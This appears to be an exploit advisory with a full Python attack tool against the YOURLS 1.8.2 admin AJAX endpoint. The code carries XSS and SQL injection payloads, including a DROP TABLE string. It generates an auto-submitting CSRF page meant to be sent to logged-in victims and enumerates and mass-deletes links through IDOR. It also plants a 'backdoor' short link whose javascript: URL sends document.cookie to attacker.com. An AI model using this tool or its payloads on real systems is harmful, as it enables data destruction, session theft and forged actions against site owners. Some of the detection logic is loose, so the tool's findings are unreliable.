@@ -1,0 +1,558 @@
+=============================================================================================================================================
+| # Title     : YOURLS 1.8.2 AJAX Endpoint Vulnerabilities                                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/yourls/yourls/                                                                                           |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212395/ & 	CVE-2022-0088
+
+[+] Summary : Critical security vulnerabilities in YOURLS /admin/ajax.php endpoint that allow attackers 
+              to perform unauthorized actions, access other users' data, and potentially compromise the entire system.
+			 
+[+] Vulnerabilities: CSRF, IDOR, Missing Authorization, Missing Input Validation			 
+			  
+[+]  POC : python poc.py
+
+#!/usr/bin/env python3
+"""
+Author: indoushka
+"""
+
+import requests
+import json
+import sys
+import argparse
+import hashlib
+import re
+from urllib.parse import urljoin
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init(autoreset=True)
+
+class YOURLS_Exploiter:
+    def __init__(self, target_url, session_cookie=None, csrf_token=None):
+        self.base_url = target_url.rstrip('/')
+        self.ajax_url = urljoin(self.base_url, 'admin/ajax.php')
+        self.session = requests.Session()
+        
+        if session_cookie:
+            self.session.headers.update({'Cookie': session_cookie})
+        
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': urljoin(self.base_url, 'admin/')
+        })
+        
+        self.csrf_token = csrf_token
+        self.vulnerabilities = []
+    
+    def print_banner(self):
+        banner = f"""
+{Fore.RED}╔══════════════════════════════════════════════════════════════╗
+║        YOURLS AJAX Endpoint Unified Exploitation Tool       ║
+║        Multiple Vulnerabilities Exploiter                   ║
+╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+        """
+        print(banner)
+    
+    def detect_vulnerabilities(self):
+        """Detect all potential vulnerabilities"""
+        print(f"{Fore.CYAN}[*] Scanning for vulnerabilities...{Style.RESET_ALL}")
+        
+        # Test 1: CSRF Vulnerability
+        self.test_csrf()
+        
+        # Test 2: IDOR Vulnerability
+        self.test_idor()
+        
+        # Test 3: Missing Input Validation
+        self.test_input_validation()
+        
+        # Test 4: Information Disclosure
+        self.test_info_disclosure()
+        
+        # Test 5: SQL Injection
+        self.test_sql_injection()
+        
+        # Print summary
+        self.print_summary()
+    
+    def test_csrf(self):
+        """Test for CSRF vulnerability"""
+        print(f"\n{Fore.YELLOW}[+] Testing CSRF Protection...{Style.RESET_ALL}")
+        
+        # Try to make a request without CSRF token
+        test_data = {
+            'action': 'add',
+            'url': 'http://test.com',
+            'keyword': 'test123',
+            'nonce': 'dummy_nonce'
+        }
+        
+        try:
+            response = self.session.post(self.ajax_url, data=test_data, timeout=10)
+            
+            if response.status_code == 200:
+                try:
+                    resp_json = response.json()
+                    if 'status' in resp_json and resp_json['status'] == 'success':
+                        print(f"{Fore.RED}[!] CSRF VULNERABLE: Action executed without proper CSRF protection{Style.RESET_ALL}")
+                        self.vulnerabilities.append({
+                            'name': 'CSRF',
+                            'severity': 'High',
+                            'description': 'Actions can be performed without CSRF token validation'
+                        })
+                    else:
+                        print(f"{Fore.GREEN}[-] CSRF protection appears to be working{Style.RESET_ALL}")
+                except:
+                    print(f"{Fore.YELLOW}[-] Could not parse response{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
+    
+    def test_idor(self):
+        """Test for Insecure Direct Object Reference"""
+        print(f"\n{Fore.YELLOW}[+] Testing IDOR Vulnerability...{Style.RESET_ALL}")
+        
+        # First, create a link to get a valid ID
+        print(f"    Step 1: Creating test link...")
+        
+        create_data = {
+            'action': 'add',
+            'url': 'http://victim-test.com',
+            'keyword': 'victimlink',
+            'nonce': self.get_nonce('add_url')
+        }
+        
+        try:
+            response = self.session.post(self.ajax_url, data=create_data, timeout=10)
+            
+            if response.status_code == 200:
+                # Try to access other IDs
+                print(f"    Step 2: Attempting IDOR enumeration...")
+                
+                for link_id in range(1, 11):
+                    test_data = {
+                        'action': 'delete',
+                        'id': link_id,
+                        'keyword': f'test{link_id}',
+                        'nonce': self.get_nonce(f'delete-link_{link_id}')
+                    }
+                    
+                    response = self.session.post(self.ajax_url, data=test_data, timeout=5)
+                    
+                    if response.status_code == 200:
+                        try:
+                            resp_json = response.json()
+                            if 'success' in resp_json and resp_json['success']:
+                                print(f"{Fore.RED}[!] IDOR VULNERABLE: Can delete link ID {link_id}{Style.RESET_ALL}")
+                                self.vulnerabilities.append({
+                                    'name': 'IDOR',
+                                    'severity': 'High',
+                                    'description': f'Can access/delete link ID {link_id} without ownership verification'
+                                })
+                                break
+                        except:
+                            pass
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
+    
+    def test_input_validation(self):
+        """Test for missing input validation"""
+        print(f"\n{Fore.YELLOW}[+] Testing Input Validation...{Style.RESET_ALL}")
+        
+        # Test XSS in URL field
+        xss_payloads = [
+            'javascript:alert(document.cookie)',
+            'data:text/html,<script>alert(1)</script>',
+            '" onmouseover="alert(1)"',
+            '<svg onload=alert(1)>'
+        ]
+        
+        for payload in xss_payloads:
+            test_data = {
+                'action': 'add',
+                'url': payload,
+                'keyword': f'xss{hashlib.md5(payload.encode()).hexdigest()[:6]}',
+                'nonce': self.get_nonce('add_url')
+            }
+            
+            try:
+                response = self.session.post(self.ajax_url, data=test_data, timeout=5)
+                
+                if response.status_code == 200:
+                    resp_text = response.text.lower()
+                    if 'alert' in resp_text or 'script' in resp_text:
+                        print(f"{Fore.RED}[!] XSS VULNERABLE: Payload accepted - {payload[:30]}...{Style.RESET_ALL}")
+                        self.vulnerabilities.append({
+                            'name': 'XSS',
+                            'severity': 'Medium',
+                            'description': f'XSS payload accepted: {payload[:50]}'
+                        })
+                        break
+            except:
+                pass
+        
+        # Test SQL Injection
+        sql_payloads = [
+            "' OR '1'='1",
+            "test'; DROP TABLE yourls_url; --",
+            "1' UNION SELECT 1,2,3,4 --"
+        ]
+        
+        for payload in sql_payloads:
+            test_data = {
+                'action': 'add',
+                'url': f'http://{payload}.com',
+                'keyword': f'sql{hashlib.md5(payload.encode()).hexdigest()[:6]}',
+                'nonce': self.get_nonce('add_url')
+            }
+            
+            try:
+                response = self.session.post(self.ajax_url, data=test_data, timeout=5)
+                
+                if 'sql' in response.text.lower() or 'union' in response.text.lower():
+                    print(f"{Fore.RED}[!] SQL INJECTION POSSIBLE: Payload triggered response{Style.RESET_ALL}")
+                    self.vulnerabilities.append({
+                        'name': 'SQL Injection',
+                        'severity': 'Critical',
+                        'description': f'SQL payload may be injectable: {payload[:50]}'
+                    })
+                    break
+            except:
+                pass
+    
+    def test_info_disclosure(self):
+        """Test for information disclosure"""
+        print(f"\n{Fore.YELLOW}[+] Testing Information Disclosure...{Style.RESET_ALL}")
+        
+        # Try to access error messages
+        test_data = {
+            'action': 'invalid_action',
+            'nonce': 'invalid_nonce'
+        }
+        
+        try:
+            response = self.session.post(self.ajax_url, data=test_data, timeout=5)
+            
+            if response.status_code == 200:
+                # Look for error messages that reveal information
+                error_indicators = [
+                    'mysql', 'database', 'sql', 'query failed',
+                    'on line', 'stack trace', 'fatal error',
+                    'warning:', 'notice:', 'undefined'
+                ]
+                
+                for indicator in error_indicators:
+                    if indicator in response.text.lower():
+                        print(f"{Fore.RED}[!] INFO DISCLOSURE: {indicator} found in response{Style.RESET_ALL}")
+                        self.vulnerabilities.append({
+                            'name': 'Information Disclosure',
+                            'severity': 'Low',
+                            'description': f'Sensitive information disclosed: {indicator}'
+                        })
+                        break
+        except Exception as e:
+            pass
+    
+    def test_sql_injection(self):
+        """Test for SQL injection vulnerabilities"""
+        print(f"\n{Fore.YELLOW}[+] Testing SQL Injection...{Style.RESET_ALL}")
+        
+        # Time-based SQL injection test
+        time_payloads = [
+            ("' OR SLEEP(5) --", "MySQL sleep"),
+            ("'; WAITFOR DELAY '00:00:05' --", "MSSQL delay"),
+            ("' AND 1=IF(1=1,SLEEP(5),0) --", "Conditional sleep")
+        ]
+        
+        for payload, description in time_payloads:
+            test_data = {
+                'action': 'add',
+                'url': f'http://test{payload}.com',
+                'keyword': f'time{hashlib.md5(payload.encode()).hexdigest()[:6]}',
+                'nonce': self.get_nonce('add_url')
+            }
+            
+            try:
+                import time
+                start_time = time.time()
+                response = self.session.post(self.ajax_url, data=test_data, timeout=10)
+                end_time = time.time()
+                
+                if end_time - start_time > 4:
+                    print(f"{Fore.RED}[!] BLIND SQL INJECTION: Time-based delay detected ({description}){Style.RESET_ALL}")
+                    self.vulnerabilities.append({
+                        'name': 'Blind SQL Injection',
+                        'severity': 'Critical',
+                        'description': f'Time-based SQLi: {description}'
+                    })
+                    break
+            except requests.exceptions.Timeout:
+                print(f"{Fore.RED}[!] BLIND SQL INJECTION: Request timeout ({description}){Style.RESET_ALL}")
+                self.vulnerabilities.append({
+                    'name': 'Blind SQL Injection',
+                    'severity': 'Critical',
+                    'description': f'Timeout on: {description}'
+                })
+                break
+            except:
+                pass
+    
+    def get_nonce(self, action):
+        """Extract or generate nonce"""
+        if self.csrf_token:
+            return self.csrf_token
+        
+        # Try to extract nonce from admin page
+        try:
+            admin_url = urljoin(self.base_url, 'admin/')
+            response = self.session.get(admin_url, timeout=5)
+            
+            # Look for nonce in HTML
+            nonce_patterns = [
+                r'name="nonce" value="([^"]+)"',
+                r'nonce=([a-f0-9]+)',
+                r'nonce:[\'"]([a-f0-9]+)[\'"]'
+            ]
+            
+            for pattern in nonce_patterns:
+                matches = re.search(pattern, response.text, re.IGNORECASE)
+                if matches:
+                    return matches.group(1)
+        except:
+            pass
+        
+        # Return dummy nonce for testing
+        return 'test_nonce_123'
+    
+    def print_summary(self):
+        """Print vulnerability summary"""
+        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] VULNERABILITY SUMMARY{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+        
+        if not self.vulnerabilities:
+            print(f"{Fore.GREEN}[+] No vulnerabilities detected{Style.RESET_ALL}")
+            return
+        
+        for i, vuln in enumerate(self.vulnerabilities, 1):
+            color = Fore.RED if vuln['severity'] in ['High', 'Critical'] else Fore.YELLOW
+            print(f"{color}[{i}] {vuln['name']} ({vuln['severity']}){Style.RESET_ALL}")
+            print(f"    {vuln['description']}")
+    
+    def exploit_csrf(self, target_url, malicious_url, keyword):
+        """Generate CSRF exploit"""
+        print(f"\n{Fore.RED}[*] Generating CSRF Exploit...{Style.RESET_ALL}")
+        
+        exploit_html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>YOURLS CSRF Exploit</title>
+</head>
+<body>
+    <h1>CSRF Attack - YOURLS Link Addition</h1>
+    
+    <form id="csrfForm" action="{self.ajax_url}" method="POST">
+        <input type="hidden" name="action" value="add">
+        <input type="hidden" name="url" value="{malicious_url}">
+        <input type="hidden" name="keyword" value="{keyword}">
+        <input type="hidden" name="nonce" value="{self.get_nonce('add_url')}">
+    </form>
+    
+    <script>
+        // Auto-submit the form
+        document.getElementById('csrfForm').submit();
+        
+        // Alternative: Iframe injection
+        function stealthSubmit() {{
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.name = 'csrfFrame';
+            document.body.appendChild(iframe);
+            
+            var form = document.getElementById('csrfForm');
+            form.target = 'csrfFrame';
+            form.submit();
+        }}
+        
+        // Uncomment for stealth mode
+        // window.onload = stealthSubmit;
+    </script>
+    
+    <p>If the form doesn't auto-submit, <a href="#" onclick="document.getElementById('csrfForm').submit(); return false;">click here</a>.</p>
+</body>
+</html>"""
+        
+        filename = f"csrf_exploit_{keyword}.html"
+        with open(filename, 'w') as f:
+            f.write(exploit_html)
+        
+        print(f"{Fore.GREEN}[+] CSRF exploit saved to: {filename}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Send this file to victim while they're logged into YOURLS{Style.RESET_ALL}")
+        
+        return filename
+    
+    def exploit_idor(self, start_id=1, end_id=100):
+        """Exploit IDOR vulnerability to enumerate links"""
+        print(f"\n{Fore.RED}[*] Exploiting IDOR Vulnerability...{Style.RESET_ALL}")
+        
+        found_links = []
+        
+        for link_id in range(start_id, end_id + 1):
+            # Try to edit display
+            test_data = {
+                'action': 'edit_display',
+                'id': link_id,
+                'keyword': f'test{link_id}',
+                'nonce': self.get_nonce(f'edit-link_{link_id}')
+            }
+            
+            try:
+                response = self.session.post(self.ajax_url, data=test_data, timeout=5)
+                
+                if response.status_code == 200:
+                    try:
+                        resp_json = response.json()
+                        if 'html' in resp_json and 'keyword' in resp_json['html'].lower():
+                            print(f"{Fore.GREEN}[+] Found link ID {link_id}{Style.RESET_ALL}")
+                            found_links.append({
+                                'id': link_id,
+                                'html': resp_json['html'][:100]
+                            })
+                    except:
+                        if 'keyword' in response.text.lower() or 'url' in response.text.lower():
+                            print(f"{Fore.GREEN}[+] Possible link ID {link_id}{Style.RESET_ALL}")
+                            found_links.append({
+                                'id': link_id,
+                                'response': response.text[:100]
+                            })
+            except:
+                pass
+        
+        if found_links:
+            print(f"\n{Fore.GREEN}[+] Found {len(found_links)} accessible links{Style.RESET_ALL}")
+            for link in found_links:
+                print(f"    ID {link['id']}: {link.get('html', link.get('response', 'No data'))}")
+        
+        return found_links
+    
+    def mass_link_deletion(self, start_id=1, end_id=50):
+        """Mass deletion via IDOR"""
+        print(f"\n{Fore.RED}[*] Attempting Mass Link Deletion...{Style.RESET_ALL}")
+        
+        deleted = []
+        
+        for link_id in range(start_id, end_id + 1):
+            test_data = {
+                'action': 'delete',
+                'id': link_id,
+                'keyword': f'del{link_id}',
+                'nonce': self.get_nonce(f'delete-link_{link_id}')
+            }
+            
+            try:
+                response = self.session.post(self.ajax_url, data=test_data, timeout=3)
+                
+                if response.status_code == 200:
+                    try:
+                        resp_json = response.json()
+                        if 'success' in resp_json and resp_json['success']:
+                            print(f"{Fore.RED}[!] Deleted link ID {link_id}{Style.RESET_ALL}")
+                            deleted.append(link_id)
+                    except:
+                        if 'success' in response.text.lower():
+                            print(f"{Fore.RED}[!] Possibly deleted link ID {link_id}{Style.RESET_ALL}")
+                            deleted.append(link_id)
+            except:
+                pass
+        
+        return deleted
+    
+    def create_backdoor(self):
+        """Create persistent backdoor via XSS or malicious link"""
+        print(f"\n{Fore.RED}[*] Creating Persistent Backdoor...{Style.RESET_ALL}")
+        
+        # Create malicious shortened link with XSS
+        xss_payload = "javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)"
+        
+        backdoor_data = {
+            'action': 'add',
+            'url': xss_payload,
+            'keyword': 'admin-panel',
+            'nonce': self.get_nonce('add_url')
+        }
+        
+        try:
+            response = self.session.post(self.ajax_url, data=backdoor_data, timeout=10)
+            
+            if response.status_code == 200:
+                print(f"{Fore.GREEN}[+] Backdoor link created: {self.base_url}/admin-panel{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[*] When admin visits this link, cookies will be sent to attacker{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[-] Failed to create backdoor: {str(e)}{Style.RESET_ALL}")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="YOURLS AJAX Endpoint Exploitation Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    
+    parser.add_argument("-u", "--url", required=True, help="Target YOURLS base URL")
+    parser.add_argument("-c", "--cookie", help="Session cookie (e.g., PHPSESSID=abc123)")
+    parser.add_argument("-t", "--token", help="CSRF/nonce token")
+    parser.add_argument("-s", "--scan", action="store_true", help="Scan for vulnerabilities")
+    parser.add_argument("-x", "--exploit", choices=['csrf', 'idor', 'mass', 'backdoor'], help="Exploit specific vulnerability")
+    parser.add_argument("--csrf-url", help="URL for CSRF exploit (with --exploit csrf)")
+    parser.add_argument("--keyword", help="Custom keyword for links")
+    parser.add_argument("--start-id", type=int, default=1, help="Start ID for IDOR enumeration")
+    parser.add_argument("--end-id", type=int, default=50, help="End ID for IDOR enumeration")
+    
+    args = parser.parse_args()
+    
+    if not args.scan and not args.exploit:
+        print(f"{Fore.RED}[-] Please specify --scan or --exploit{Style.RESET_ALL}")
+        return
+    
+    # Initialize exploiter
+    exploiter = YOURLS_Exploiter(args.url, args.cookie, args.token)
+    exploiter.print_banner()
+    
+    if args.scan:
+        exploiter.detect_vulnerabilities()
+    
+    if args.exploit:
+        if args.exploit == 'csrf':
+            if not args.csrf_url:
+                print(f"{Fore.RED}[-] Please specify --csrf-url for CSRF exploit{Style.RESET_ALL}")
+                return
+            
+            keyword = args.keyword or f"mal_{hashlib.md5(args.csrf_url.encode()).hexdigest()[:8]}"
+            exploiter.exploit_csrf(args.url, args.csrf_url, keyword)
+        
+        elif args.exploit == 'idor':
+            found = exploiter.exploit_idor(args.start_id, args.end_id)
+            if found:
+                print(f"\n{Fore.GREEN}[+] IDOR exploitation complete{Style.RESET_ALL}")
+        
+        elif args.exploit == 'mass':
+            confirm = input(f"{Fore.RED}[!] This will attempt to delete multiple links. Continue? (y/n): {Style.RESET_ALL}")
+            if confirm.lower() == 'y':
+                deleted = exploiter.mass_link_deletion(args.start_id, args.end_id)
+                print(f"\n{Fore.RED}[!] Attempted to delete {len(deleted)} links{Style.RESET_ALL}")
+        
+        elif args.exploit == 'backdoor':
+            exploiter.create_backdoor()
+
+if __name__ == "__main__":
+    main()
+	
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
